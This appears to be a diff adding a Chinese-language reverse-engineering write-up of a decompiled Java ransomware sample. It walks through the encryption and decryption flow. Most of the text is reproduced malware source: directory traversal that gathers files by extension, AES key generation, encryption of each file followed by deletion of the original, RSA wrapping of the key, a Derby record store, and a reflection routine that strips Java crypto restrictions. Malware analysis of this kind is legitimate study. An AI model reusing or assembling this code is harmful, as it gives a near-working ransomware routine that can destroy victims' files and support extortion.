+    this.midMap = new HashMap&lt;String, String&gt;();
+    this.mp3Map = new HashMap&lt;String, String&gt;();
+    this.mpaMap = new HashMap&lt;String, String&gt;();
+    this.raMap = new HashMap&lt;String, String&gt;();
+    this.wavMap = new HashMap&lt;String, String&gt;();
+    this.wmaMap = new HashMap&lt;String, String&gt;();
+    this.g2Map = new HashMap&lt;String, String&gt;();
+    this.gpMap = new HashMap&lt;String, String&gt;();
+    this.asfMap = new HashMap&lt;String, String&gt;();
+    this.asxMap = new HashMap&lt;String, String&gt;();
+    this.aviMap = new HashMap&lt;String, String&gt;();
+    this.flvlvMap = new HashMap&lt;String, String&gt;();
+    this.m4vMap = new HashMap&lt;String, String&gt;();
+    this.movMap = new HashMap&lt;String, String&gt;();
+    this.mp4Map = new HashMap&lt;String, String&gt;();
+    this.mpgMap = new HashMap&lt;String, String&gt;();
+    this.rmMap = new HashMap&lt;String, String&gt;();
+    this.srtMap = new HashMap&lt;String, String&gt;();
+    this.swfMap = new HashMap&lt;String, String&gt;();
+    this.vobMap = new HashMap&lt;String, String&gt;();
+    this.wmvMap = new HashMap&lt;String, String&gt;();
+    this.d3mMap = new HashMap&lt;String, String&gt;();
+    this.d3sMap = new HashMap&lt;String, String&gt;();
+    this.maxMap = new HashMap&lt;String, String&gt;();
+    this.objMap = new HashMap&lt;String, String&gt;();
+    this.bmpMap = new HashMap&lt;String, String&gt;();
+    this.ddaMap = new HashMap&lt;String, String&gt;();
+    this.gifMap = new HashMap&lt;String, String&gt;();
+    this.jpgMap = new HashMap&lt;String, String&gt;();
+    this.pngMap = new HashMap&lt;String, String&gt;();
+    this.psdMap = new HashMap&lt;String, String&gt;();
+    this.pspimageMap = new HashMap&lt;String, String&gt;();
+    this.tgaMap = new HashMap&lt;String, String&gt;();
+    this.thmMap = new HashMap&lt;String, String&gt;();
+    this.tifMap = new HashMap&lt;String, String&gt;();
+    this.tiffMap = new HashMap&lt;String, String&gt;();
+    this.yuvMap = new HashMap&lt;String, String&gt;();
+    this.aiMap = new HashMap&lt;String, String&gt;();
+    this.epsMap = new HashMap&lt;String, String&gt;();
+    this.psMap = new HashMap&lt;String, String&gt;();
+    this.svgMap = new HashMap&lt;String, String&gt;();
+    this.inddMap = new HashMap&lt;String, String&gt;();
+    this.pctMap = new HashMap&lt;String, String&gt;();
+    this.pdfMap = new HashMap&lt;String, String&gt;();
+    this.xlrMap = new HashMap&lt;String, String&gt;();
+    this.xlsMap = new HashMap&lt;String, String&gt;();
+    this.xlsxMap = new HashMap&lt;String, String&gt;();
+    this.z7Map = new HashMap&lt;String, String&gt;();
+    this.rarMap = new HashMap&lt;String, String&gt;();
+    this.zipMap = new HashMap&lt;String, String&gt;();
+    this.targzMap = new HashMap&lt;String, String&gt;();
+    this.apkMap = new HashMap&lt;String, String&gt;();
+    this.appMap = new HashMap&lt;String, String&gt;();
+    this.comMap = new HashMap&lt;String, String&gt;();
+    this.exeMap = new HashMap&lt;String, String&gt;();
+    this.aspMap = new HashMap&lt;String, String&gt;();
+    this.aspxMap = new HashMap&lt;String, String&gt;();
+    this.cssMap = new HashMap&lt;String, String&gt;();
+    this.htmMap = new HashMap&lt;String, String&gt;();
+    this.htmlMap = new HashMap&lt;String, String&gt;();
+    this.jsMap = new HashMap&lt;String, String&gt;();
+    this.jspMap = new HashMap&lt;String, String&gt;();
+    this.phpMap = new HashMap&lt;String, String&gt;();
+    this.xhtmlMap = new HashMap&lt;String, String&gt;();
+    this.fntMap = new HashMap&lt;String, String&gt;();
+    this.fontMap = new HashMap&lt;String, String&gt;();
+    this.oftMap = new HashMap&lt;String, String&gt;();
+    this.ttfMap = new HashMap&lt;String, String&gt;();
+    this.crdownloadMap = new HashMap&lt;String, String&gt;();
+    this.icsMap = new HashMap&lt;String, String&gt;();
+    this.msiMap = new HashMap&lt;String, String&gt;();
+    this.partMap = new HashMap&lt;String, String&gt;();
+    this.torrentMap = new HashMap&lt;String, String&gt;();
+    this.containsFilters = new TreeMap&lt;String, HashMap&lt;String, String&gt;&gt;();
+    this.PathtoFind = PathtoFind;
+    this.AddContainFilter();
+    this.SavAllFilters();
+}
+</code></pre><p>后面这几句，初始化最总返回的容器对象，初始化路径变量，然后调用<code>AddContainFilter()</code>和<code>SavAllFilters()</code>两个方法</p>
+<pre><code>this.containsFilters = new TreeMap&lt;String, HashMap&lt;String, String&gt;&gt;();
+this.PathtoFind = PathtoFind;
+this.AddContainFilter();
+this.SavAllFilters();
+</code></pre><p><code>AddContainFilter()</code>方法，先将各种后缀文件的HashMap存储到<code>containsFilters</code>里，那么这里键和键值就可以知道是什么了，键是后缀名，键值是对应的HashMap</p>
+<pre><code>private void AddContainFilter() {
+    this.containsFilters.put(&quot;doc&quot;, this.docMap);
+    this.containsFilters.put(&quot;docx&quot;, this.docxMap);
+    this.containsFilters.put(&quot;log&quot;, this.logMap);
+    this.containsFilters.put(&quot;msg&quot;, this.msgMap);
+    this.containsFilters.put(&quot;odt&quot;, this.odtMap);
+    this.containsFilters.put(&quot;pages&quot;, this.pagesMap);
+    this.containsFilters.put(&quot;rtf&quot;, this.rtfMap);
+    this.containsFilters.put(&quot;tex&quot;, this.texMap);
+    this.containsFilters.put(&quot;txt&quot;, this.txtMap);
+    this.containsFilters.put(&quot;wpd&quot;, this.wpdMap);
+    this.containsFilters.put(&quot;wps&quot;, this.wpsMap);
+    this.containsFilters.put(&quot;hwp&quot;, this.hwpMap);
+    this.containsFilters.put(&quot;csv&quot;, this.csvMap);
+    this.containsFilters.put(&quot;dat&quot;, this.datMap);
+    this.containsFilters.put(&quot;gbr&quot;, this.gbrMap);
+    this.containsFilters.put(&quot;ged&quot;, this.gedMap);
+    this.containsFilters.put(&quot;key&quot;, this.keyMap);
+    this.containsFilters.put(&quot;keychain&quot;, this.keychainMap);
+    this.containsFilters.put(&quot;pps&quot;, this.ppsMap);
+    this.containsFilters.put(&quot;ppt&quot;, this.pptMap);
+    this.containsFilters.put(&quot;pptx&quot;, this.pptxMap);
+    this.containsFilters.put(&quot;sdf&quot;, this.sdfMap);
+    this.containsFilters.put(&quot;tar&quot;, this.tarMap);
+    this.containsFilters.put(&quot;tax2012&quot;, this.tax2012Map);
+    this.containsFilters.put(&quot;tax2014&quot;, this.tax2014Map);
+    this.containsFilters.put(&quot;vcf&quot;, this.vcfMap);
+    this.containsFilters.put(&quot;xml&quot;, this.xmlMap);
+    this.containsFilters.put(&quot;alf&quot;, this.alfMap);
+    this.containsFilters.put(&quot;iff&quot;, this.iffMap);
+    this.containsFilters.put(&quot;m3u&quot;, this.m3uMap);
+    this.containsFilters.put(&quot;m4a&quot;, this.m4aMap);
+    this.containsFilters.put(&quot;mid&quot;, this.midMap);
+    this.containsFilters.put(&quot;mp3&quot;, this.mp3Map);
+    this.containsFilters.put(&quot;mpa&quot;, this.mpaMap);
+    this.containsFilters.put(&quot;ra&quot;, this.raMap);
+    this.containsFilters.put(&quot;wav&quot;, this.wavMap);
+    this.containsFilters.put(&quot;wma&quot;, this.wmaMap);
+    this.containsFilters.put(&quot;3g2&quot;, this.g2Map);
+    this.containsFilters.put(&quot;3gp&quot;, this.gpMap);
+    this.containsFilters.put(&quot;asf&quot;, this.asfMap);
+    this.containsFilters.put(&quot;asx&quot;, this.asxMap);
+    this.containsFilters.put(&quot;avi&quot;, this.aviMap);
+    this.containsFilters.put(&quot;flv&quot;, this.flvlvMap);
+    this.containsFilters.put(&quot;m4a&quot;, this.m4vMap);
+    this.containsFilters.put(&quot;mov&quot;, this.movMap);
+    this.containsFilters.put(&quot;mp4&quot;, this.mp4Map);
+    this.containsFilters.put(&quot;mpg&quot;, this.mpgMap);
+    this.containsFilters.put(&quot;rm&quot;, this.rmMap);
+    this.containsFilters.put(&quot;srt&quot;, this.srtMap);
+    this.containsFilters.put(&quot;swf&quot;, this.swfMap);
+    this.containsFilters.put(&quot;vob&quot;, this.vobMap);
+    this.containsFilters.put(&quot;wmv&quot;, this.wmvMap);
+    this.containsFilters.put(&quot;3dm&quot;, this.d3mMap);
+    this.containsFilters.put(&quot;3ds&quot;, this.d3sMap);
+    this.containsFilters.put(&quot;max&quot;, this.maxMap);
+    this.containsFilters.put(&quot;obj&quot;, this.objMap);
+    this.containsFilters.put(&quot;bmp&quot;, this.bmpMap);
+    this.containsFilters.put(&quot;dda&quot;, this.ddaMap);
+    this.containsFilters.put(&quot;gif&quot;, this.gifMap);
+    this.containsFilters.put(&quot;jpg&quot;, this.jpgMap);
+    this.containsFilters.put(&quot;png&quot;, this.pngMap);
+    this.containsFilters.put(&quot;psd&quot;, this.psdMap);
+    this.containsFilters.put(&quot;pspimage&quot;, this.pspimageMap);
+    this.containsFilters.put(&quot;tga&quot;, this.tgaMap);
+    this.containsFilters.put(&quot;thm&quot;, this.thmMap);
+    this.containsFilters.put(&quot;tif&quot;, this.tifMap);
+    this.containsFilters.put(&quot;tiff&quot;, this.tiffMap);
+    this.containsFilters.put(&quot;yuv&quot;, this.yuvMap);
+    this.containsFilters.put(&quot;ai&quot;, this.aiMap);
+    this.containsFilters.put(&quot;eps&quot;, this.epsMap);
+    this.containsFilters.put(&quot;ps&quot;, this.psMap);
+    this.containsFilters.put(&quot;svg&quot;, this.svgMap);
+    this.containsFilters.put(&quot;indd&quot;, this.inddMap);
+    this.containsFilters.put(&quot;pct&quot;, this.pctMap);
+    this.containsFilters.put(&quot;pdf&quot;, this.pdfMap);
+    this.containsFilters.put(&quot;xlr&quot;, this.xlrMap);
+    this.containsFilters.put(&quot;xls&quot;, this.xlsMap);
+    this.containsFilters.put(&quot;xlsx&quot;, this.xlsxMap);
+    this.containsFilters.put(&quot;7z&quot;, this.z7Map);
+    this.containsFilters.put(&quot;rar&quot;, this.rarMap);
+    this.containsFilters.put(&quot;zip&quot;, this.zipMap);
+    this.containsFilters.put(&quot;tar.gz&quot;, this.targzMap);
+    this.containsFilters.put(&quot;apk&quot;, this.apkMap);
+    this.containsFilters.put(&quot;app&quot;, this.appMap);
+    this.containsFilters.put(&quot;com&quot;, this.comMap);
+    this.containsFilters.put(&quot;exe&quot;, this.exeMap);
+    this.containsFilters.put(&quot;asp&quot;, this.aspMap);
+    this.containsFilters.put(&quot;apsx&quot;, this.aspxMap);
+    this.containsFilters.put(&quot;css&quot;, this.cssMap);
+    this.containsFilters.put(&quot;htm&quot;, this.htmMap);
+    this.containsFilters.put(&quot;html&quot;, this.htmlMap);
+    this.containsFilters.put(&quot;js&quot;, this.jsMap);
+    this.containsFilters.put(&quot;jsp&quot;, this.jspMap);
+    this.containsFilters.put(&quot;php&quot;, this.phpMap);
+    this.containsFilters.put(&quot;xhtml&quot;, this.xhtmlMap);
+    this.containsFilters.put(&quot;fnt&quot;, this.fntMap);
+    this.containsFilters.put(&quot;font&quot;, this.fontMap);
+    this.containsFilters.put(&quot;oft&quot;, this.oftMap);
+    this.containsFilters.put(&quot;ttf&quot;, this.ttfMap);
+    this.containsFilters.put(&quot;crdownload&quot;, this.crdownloadMap);
+    this.containsFilters.put(&quot;ics&quot;, this.icsMap);
+    this.containsFilters.put(&quot;msi&quot;, this.msiMap);
+    this.containsFilters.put(&quot;part&quot;, this.partMap);
+    this.containsFilters.put(&quot;torrent&quot;, this.torrentMap);
+}
+</code></pre><p>然后<code>SavAllFilters()</code>方法</p>
+<pre><code>private void SavAllFilters() {
+    try (final Stream&lt;Path&gt; paths = Files.walk(Paths.get(this.PathtoFind, new String[0]), new FileVisitOption[0])) {
+        final String extendsion;
+        final String FilePath;
+        paths.forEach(filePath -&gt; {
+            if (Files.isRegularFile(filePath, new LinkOption[0])) {
+                System.out.println(filePath);
+                extendsion = FilenameUtils.getExtension(filePath.toString());
+                FilePath = FilenameUtils.removeExtension(filePath.toString());
+                this.SaveToMap(extendsion, FilePath);
+            }
+            return;
+        });
+    }
+    catch (IOException e) {
+        e.printStackTrace();
+    }
+}
+</code></pre><p>一开始这代码看得我有点懵逼，原谅我没见过世面，我是真的觉得这代码写的值得我学习</p>
+<p>没搜到什么相关的资料，决定翻源码，这个方法在<code>Paths</code>类里面，<code>get()</code>方法会返回一个<code>Path</code>类型对象，本质上调用了<code>getPath()</code>方法，这个方法能搜到的资料就相对多很多了</p>
+<pre><code>/**
+ * Converts a path string, or a sequence of strings that when joined form
+ * a path string, to a {@code Path}. If {@code more} does not specify any
+ * elements then the value of the {@code first} parameter is the path string
+ * to convert. If {@code more} specifies one or more elements then each
+ * non-empty string, including {@code first}, is considered to be a sequence
+ * of name elements (see {@link Path}) and is joined to form a path string.
+ * The details as to how the Strings are joined is provider specific but
+ * typically they will be joined using the {@link FileSystem#getSeparator
+ * name-separator} as the separator. For example, if the name separator is
+ * &quot;{@code /}&quot; and {@code getPath(&quot;/foo&quot;,&quot;bar&quot;,&quot;gus&quot;)} is invoked, then the
+ * path string {@code &quot;/foo/bar/gus&quot;} is converted to a {@code Path}.
+ * A {@code Path} representing an empty path is returned if {@code first}
+ * is the empty string and {@code more} does not contain any non-empty
+ * strings.
+ *
+ * &lt;p&gt; The {@code Path} is obtained by invoking the {@link FileSystem#getPath
+ * getPath} method of the {@link FileSystems#getDefault default} {@link
+ * FileSystem}.
+ *
+ * &lt;p&gt; Note that while this method is very convenient, using it will imply
+ * an assumed reference to the default {@code FileSystem} and limit the
+ * utility of the calling code. Hence it should not be used in library code
+ * intended for flexible reuse. A more flexible alternative is to use an
+ * existing {@code Path} instance as an anchor, such as:
+ * &lt;pre&gt;
+ *     Path dir = ...
+ *     Path path = dir.resolve(&quot;file&quot;);
+ * &lt;/pre&gt;
+ *
+ * @param   first
+ *          the path string or initial part of the path string
+ * @param   more
+ *          additional strings to be joined to form the path string
+ *
+ * @return  the resulting {@code Path}
+ *
+ * @throws  InvalidPathException
+ *          if the path string cannot be converted to a {@code Path}
+ *
+ * @see FileSystem#getPath
+ */
+public static Path get(String first, String... more) {
+    return FileSystems.getDefault().getPath(first, more);
+}
+</code></pre><p>然后迭代，这里<code>paths</code>的类型<code>Stream</code>是Java 8的新特性，比<code>Iterator</code>强，最后将后缀名与去掉后缀名的路径传给<code>SaveToMap(extendsion, FilePath)</code>方法，这里会在控制台输出所有文件的路径</p>
+<pre><code>paths.forEach(filePath -&gt; {
+    if (Files.isRegularFile(filePath, new LinkOption[0])) {
+        System.out.println(filePath);
+        extendsion = FilenameUtils.getExtension(filePath.toString());
+        FilePath = FilenameUtils.removeExtension(filePath.toString());
+        this.SaveToMap(extendsion, FilePath);
+    }
+    return;
+});
+</code></pre><p>至于<code>Files.isRegularFile()</code>方法所判断的类型，StackOverFlow上面的网友是这样回答的：</p>
+<blockquote>
+<p>I figure rm -i is an alias, possibly rm -i. The &quot;regular&quot; part doesn&#39;t mean anything in particular, it only means that it&#39;s not a pipe, device, socket or anything other &quot;special&quot;.</p>
+<p>it means the file is not a symlink, pipe, rand, null, cpu, etc. Perhaps you have heard the linux philosophy everything is a text. This isn&#39;t literally true, but it suggests a dominant operational context where string processing tools can be applied to filesystem elements directly. In this case, it means that in a more literal fashion. To see the detection step in isolation, try the command file, as in file /etc/passwd or file /dev/null.</p>
+</blockquote>
+<p><code>SaveToMap()</code>方法非常长，700多行，这里看图比较好</p>
+<p><img src="Image/6.png" alt=""></p>
+<p>没看懂的是为什么不直判断后缀名而是先执行<code>hashcode()</code>，可能是反编译器的问题，也可能是编译的问题，不过这个地方可能击中了jdgui的bug，通过判断后缀给n赋值，然后在第二个switch里面进行操作</p>
+<p><img src="Image/7.png" alt=""></p>
+<p>迭代完返回，但是上面在创建对象的时候调用了<code>GetFileMap()</code>，在初始化完之后获取了<code>containsFilters</code>，这里包含了目标路径下所有文件的路径，后缀信息</p>
+<pre><code>public TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; GetFileMap() {
+    return this.containsFilters;
+}
+</code></pre><p>在获取了目标路径下的文件信息后，设置迭代器，并定义一个key</p>
+<pre><code>final Set set = containsFilters.entrySet();
+final Iterator iterator = set.iterator();
+SecretKeySpec aesKey = null;
+</code></pre><p>然后初始化key</p>
+<pre><code>aesKey = CryptoRansomware.GenKey();
+</code></pre><p><code>GenKey()</code>方法</p>
+<pre><code>public static SecretKeySpec GenKey() throws NoSuchAlgorithmException, RansomwareException, SQLException {
+    if (EmbeddedDatabase.CreateTable()) {
+        throw new RansomwareException(&quot;Already Encrypted And Stored To Embedded Database&quot;);
+    }
+    final KeyGenerator kgen = KeyGenerator.getInstance(&quot;AES&quot;);
+    kgen.init(256);
+    final SecretKey key = kgen.generateKey();
+    final byte[] aesKey = key.getEncoded();
+    final SecretKeySpec aeskeySpec = new SecretKeySpec(aesKey, &quot;AES&quot;);
+    return aeskeySpec;
+}
+</code></pre><p>类<code>CryptoRansomware</code>有一个static代码块，在第一次加载的时候执行一次，初始化了一个byte数组，调用了<code>removeCryptographyRestrictions()</code>方法</p>
+<pre><code>static {
+    CryptoRansomware.ivBytes = new byte[] { 21, 20, 19, 18, 17, 16, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 };
+    removeCryptographyRestrictions();
+}
+</code></pre><p><code>removeCryptographyRestrictions()</code>方法</p>
+<pre><code>private static void removeCryptographyRestrictions() {
+    if (!isRestrictedCryptography()) {
+        System.out.println(&quot;Cryptography restrictions removal not needed&quot;);
+        return;
+    }
+    try {
+        final Class&lt;?&gt; jceSecurity = Class.forName(&quot;javax.crypto.JceSecurity&quot;);
+        final Class&lt;?&gt; cryptoPermissions = Class.forName(&quot;javax.crypto.CryptoPermissions&quot;);
+        final Class&lt;?&gt; cryptoAllPermission = Class.forName(&quot;javax.crypto.CryptoAllPermission&quot;);
+        final Field isRestrictedField = jceSecurity.getDeclaredField(&quot;isRestricted&quot;);
+        isRestrictedField.setAccessible(true);
+        final Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);
+        modifiersField.setAccessible(true);
+        modifiersField.setInt(isRestrictedField, isRestrictedField.getModifiers() &amp; 0xFFFFFFEF);
+        isRestrictedField.set(null, false);
+        final Field defaultPolicyField = jceSecurity.getDeclaredField(&quot;defaultPolicy&quot;);
+        defaultPolicyField.setAccessible(true);
+        final PermissionCollection defaultPolicy = (PermissionCollection)defaultPolicyField.get(null);
+        final Field perms = cryptoPermissions.getDeclaredField(&quot;perms&quot;);
+        perms.setAccessible(true);
+        ((Map)perms.get(defaultPolicy)).clear();
+        final Field instance = cryptoAllPermission.getDeclaredField(&quot;INSTANCE&quot;);
+        instance.setAccessible(true);
+        defaultPolicy.add((Permission)instance.get(null));
+        System.out.println(&quot;Successfully removed cryptography restrictions&quot;);
+    }
+    catch (Exception e) {
+        System.out.println(&quot;Failed to remove cryptography restrictions&quot; + e);
+    }
+}
+</code></pre><p>因为是在初始化的时候直接调用，并没有做判断，所以在最开始调用了<code>isRestrictedCryptography()</code>做了一下判断</p>
+<pre><code>private static boolean isRestrictedCryptography() {
+    return &quot;Java(TM) SE Runtime Environment&quot;.equals(System.getProperty(&quot;java.runtime.name&quot;));
+}
+</code></pre><p>这里主要用于确保后续有对某些类里字段的操作权限</p>
+<p>继续<code>GenKey()</code>，先进行一个判断<code>EmbeddedDatabase.CreateTable()</code>，先创建一个表，如果表存在，返回<code>true</code>，如果不存在，则创建</p>
+<pre><code>public static boolean CreateTable() {
+    PreparedStatement preparedStatement = null;
+    boolean flag = false;
+    final String createTableSQL = &quot;CREATE TABLE RansomTable(MapTable BLOB ,EncryptedKey VARCHAR(100))&quot;;
+    try {
+        preparedStatement = EmbeddedDatabase.conn.prepareStatement(createTableSQL);
+        System.out.println(createTableSQL);
+        preparedStatement.executeUpdate();
+        EmbeddedDatabase.conn.commit();
+        System.out.println(&quot;TableRansomTableis created!&quot;);
+    }
+    catch (SQLException e) {
+        System.out.println(e.getMessage());
+        if (DerbyUtils.tableAlreadyExists(e)) {
+            flag = true;
+        }
+        if (preparedStatement != null) {
+            try {
+                preparedStatement.close();
+            }
+            catch (SQLException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+    finally {
+        if (preparedStatement != null) {
+            try {
+                preparedStatement.close();
+            }
+            catch (SQLException e2) {
+                e2.printStackTrace();
+            }
+        }
+    }
+    return flag;
+}
+</code></pre><p>类<code>EmbeddedDatabase</code>有一个static代码块，在第一次加载的时候执行一次，连接数据库，这里用的是<code>derby</code></p>
+<pre><code>static {
+    Connection tempconn = null;
+    try {
+        Class.forName(&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;);
+        tempconn = DriverManager.getConnection(&quot;jdbc:derby:RansomDB;create=true&quot;);
+        if (tempconn != null) {
+            System.out.println(&quot;connect success&quot;);
+        }
+    }
+    catch (Exception except) {
+        except.printStackTrace();
+    }
+    conn = tempconn;
+}
+</code></pre><p><code>GenKey()</code>方法剩下的代码就是在初始化key了，加密方式是AES</p>
+<p>继续<code>StartEncryptProcess()</code>，在初始化完key以及其它准备工作后，进行迭代，加密后的文件统一使用<code>.aes</code>后缀</p>
+<pre><code>while (iterator.hasNext()) {
+    final Map.Entry mentry = (Map.Entry)iterator.next();
+    final Object obj = mentry.getValue();
+    final ObjectMapper oMapper = new ObjectMapper();
+    final HashMap&lt;String, String&gt; Map = (HashMap&lt;String, String&gt;)oMapper.&lt;HashMap&lt;String, String&gt;&gt;convertValue(obj, (Class&lt;HashMap&lt;String, String&gt;&gt;)HashMap.class);
+    final Set mapset = Map.entrySet();
+    for (final Map.Entry entry : mapset) {
+        final File filein = new File(entry.getKey() + &quot;.&quot; + entry.getValue());
+        final File fileout = new File(entry.getKey() + &quot;.aes&quot;);
+        CryptoRansomware.EncryptFile(filein, fileout, aesKey);
+    }
+}
+</code></pre><p>对文件进行加密</p>
+<pre><code>CryptoRansomware.EncryptFile(filein, fileout, aesKey);
+</code></pre><p>进行AES加密，加密完成删除源文件，并且输出已删除的文件路径</p>
+<pre><code>public static void EncryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
+    try {
+        final Cipher aesCipher = Cipher.getInstance(&quot;AES/CFB8/NoPadding&quot;);
+        aesCipher.init(1, aeskeySpec, new IvParameterSpec(CryptoRansomware.ivBytes));
+        final FileInputStream is = new FileInputStream(in);
+        final CipherOutputStream os = new CipherOutputStream(new FileOutputStream(out), aesCipher);
+        copy(is, os);
+        is.close();
+        os.close();
+    }
+    catch (IOException ex) {
+        ex.printStackTrace();
+    }
+    catch (NoSuchPaddingException e) {
+        e.printStackTrace();
+    }
+    catch (NoSuchAlgorithmException e2) {
+        e2.printStackTrace();
+    }
+    catch (InvalidAlgorithmParameterException e3) {
+        e3.printStackTrace();
+    }
+    catch (InvalidKeyException e4) {
+        e4.printStackTrace();
+    }
+    final boolean bool = in.delete();
+    System.out.println(&quot;File deleted: &quot; + bool);
+}
+</code></pre><p>在迭代完加密后，将记录信息保存到数据库</p>
+<pre><code>EmbeddedDatabase.InsertRecordIntoTable(containsFilters, CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey));
+</code></pre><p>虽然这里就一句，但后面执行的代码多着，我们先看第二个参数</p>
+<pre><code>CryptoRansomware.RetrieveEncryptedAesKey(pubkey, aesKey)
+</code></pre><p><code>pubkey</code>是最开始<code>APP</code>类的公钥，第二个是AES加密的秘钥</p>
+<pre><code>public static String RetrieveEncryptedAesKey(final String pubkey, final SecretKeySpec AesKeyspec) throws SQLException, GeneralSecurityException {
+    return Encrypt(RsaKeyReader.loadPublicKey(pubkey), AesKeyspec);
+}
+</code></pre><p>再看这里的第一个参数<code>RsaKeyReader.loadPublicKey(pubkey)</code>，可以看出来，在<code>APP</code>类里显示的是<code>Base64</code>哈希过后的，这里先进行<code>Base64</code>还原，再处理公钥，哈希方式为RSA</p>
+<pre><code>public static PublicKey loadPublicKey(final String stored) throws GeneralSecurityException {
+    final byte[] data = Base64.decodeBase64(stored);
+    final X509EncodedKeySpec spec = new X509EncodedKeySpec(data);
+    final KeyFactory fact = KeyFactory.getInstance(&quot;RSA&quot;);
+    return fact.generatePublic(spec);
+}
+</code></pre><p>再来看<code>Encrypt(RsaKeyReader.loadPublicKey(pubkey), AesKeyspec)</code>，先将AES的秘钥进行<code>Base64</code>哈希，然后进行RSA加密，加密完后再进行<code>Base64</code>哈希</p>
+<pre><code>public static String Encrypt(final PublicKey pubKey, final SecretKeySpec aeskeySpec) {
+    String encryptedString = &quot;&quot;;
+    try {
+        final String encodedKey = Base64.encodeBase64String(aeskeySpec.getEncoded());
+        final byte[] plainBytes = encodedKey.getBytes(&quot;UTF-8&quot;);
+        final Cipher cipher = Cipher.getInstance(&quot;RSA&quot;);
+        cipher.init(1, pubKey);
+        final byte[] encrypted = cipher.doFinal(plainBytes);
+        encryptedString = new String(Base64.encodeBase64(encrypted));
+        return encryptedString;
+    }
+    catch (NoSuchAlgorithmException e) {
+        e.printStackTrace();
+    }
+    catch (NoSuchPaddingException e2) {
+        e2.printStackTrace();
+    }
+    catch (BadPaddingException e3) {
+        e3.printStackTrace();
+    }
+    catch (IllegalBlockSizeException e4) {
+        e4.printStackTrace();
+    }
+    catch (InvalidKeyException e5) {
+        e5.printStackTrace();
+    }
+    catch (UnsupportedEncodingException e6) {
+        e6.printStackTrace();
+    }
+    return encryptedString;
+}
+</code></pre><p>那么回到最开始的保存到数据库的操作<code>InsertRecordIntoTable()</code>，数据插入，输出<code>Insert Success</code></p>
+<pre><code>public static void InsertRecordIntoTable(final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; map, final String EncryptedKey) {
+    PreparedStatement preparedStatement = null;
+    final String insertTableSQL = &quot;insert into RansomTable values(?,?)&quot;;
+    try {
+        preparedStatement = EmbeddedDatabase.conn.prepareStatement(insertTableSQL);
+        final byte[] buf = Serializer.Serialize(map);
+        preparedStatement.setBinaryStream(1, new ByteArrayInputStream(buf), buf.length);
+        preparedStatement.setString(2, EncryptedKey);
+        preparedStatement.executeUpdate();
+        EmbeddedDatabase.conn.commit();
+        System.out.println(&quot;Insert Success&quot;);
+    }
+    catch (SQLException e) {
+        System.out.println(e.getMessage());
+    }
+    catch (IOException e2) {
+        e2.printStackTrace();
+    }
+    finally {
+        if (preparedStatement != null) {
+            try {
+                preparedStatement.close();
+            }
+            catch (SQLException e3) {
+                e3.printStackTrace();
+            }
+        }
+    }
+}
+</code></pre><p>在将文件信息存储到数据库前会进行处理，转换成byte数组类型</p>
+<pre><code>final byte[] buf = Serializer.Serialize(map);
+</code></pre><p>转成byte数组，其实看上面的返回值就可以</p>
+<pre><code>public static byte[] Serialize(final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; map) throws IOException {
+    final ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    final ObjectOutputStream oos = new ObjectOutputStream(baos);
+    oos.writeObject(map);
+    oos.close();
+    return baos.toByteArray();
+}
+</code></pre><p>以上就是加密的所有过程，接下来分析解密过程</p>
+<p>解密的分支</p>
+<pre><code>p.StartDecryptProcess(PrivateKey);
+</code></pre><p>在具体分析前我们可以大概的猜到解密的过程，开始加密的时候将map转为byte数组，那么肯定先要将byte数组转为map，然后迭代用私钥进行解密，不熟悉RSA的同学建议去学习一下RSA的原理，公钥加密，私钥解密，同时公钥还可以作为加密者的身份认证作用</p>
+<pre><code>public void StartDecryptProcess(final String privKey) {
+    try {
+        final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; containsFilters = EmbeddedDatabase.GetMapFromTable();
+        final Set set = containsFilters.entrySet();
+        final Iterator iterator = set.iterator();
+        final SecretKeySpec aesKey = CryptoRansomware.RetrieveAesKey(privKey);
+        while (iterator.hasNext()) {
+            final Map.Entry mentry = (Map.Entry)iterator.next();
+            final Object obj = mentry.getValue();
+            final ObjectMapper oMapper = new ObjectMapper();
+            final HashMap&lt;String, String&gt; Map = (HashMap&lt;String, String&gt;)oMapper.&lt;HashMap&lt;String, String&gt;&gt;convertValue(obj, (Class&lt;HashMap&lt;String, String&gt;&gt;)HashMap.class);
+            final Set mapset = Map.entrySet();
+            for (final Map.Entry entry : mapset) {
+                final File filein = new File(entry.getKey() + &quot;.&quot; + entry.getValue());
+                final File fileout = new File(entry.getKey() + &quot;.aes&quot;);
+                CryptoRansomware.DecryptFile(fileout, filein, aesKey);
+            }
+        }
+    }
+    catch (NoSuchAlgorithmException e) {
+        e.printStackTrace();
+    }
+    catch (SQLException e2) {
+        e2.printStackTrace();
+    }
+    catch (GeneralSecurityException e3) {
+        e3.printStackTrace();
+    }
+    catch (NullPointerException e4) {
+        System.out.println(&quot;Map not Exists Encrypt First&quot;);
+    }
+    finally {
+        EmbeddedDatabase.DropTable();
+    }
+}
+</code></pre><p>将byte数组转为map对象</p>
+<pre><code>final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; containsFilters = EmbeddedDatabase.GetMapFromTable();
+</code></pre><p>关键是调用<code>Serializer.Deserialize();</code></p>
+<pre><code>public static TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; GetMapFromTable() {
+    PreparedStatement preparedStatement = null;
+    TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; map = null;
+    final String selectSQL = &quot;SELECT MapTable FROM RansomTable &quot;;
+    try {
+        preparedStatement = EmbeddedDatabase.conn.prepareStatement(selectSQL);
+        final ResultSet rs = preparedStatement.executeQuery();
+        if (rs.next()) {
+            final InputStream input = rs.getBinaryStream(&quot;MapTable&quot;);
+            map = Serializer.Deserialize(input);
+            return map;
+        }
+    }
+    catch (SQLException e) {
+        System.out.println(e.getMessage());
+    }
+    catch (Exception e2) {
+        return map;
+    }
+    finally {
+        try {
+            if (preparedStatement != null) {
+                preparedStatement.close();
+            }
+        }
+        catch (Exception ex) {
+            System.out.println(&quot;Exception during Resource.close()&quot; + ex);
+        }
+    }
+    return map;
+}
+</code></pre><p>这里就相当于一个反序列化的过程了</p>
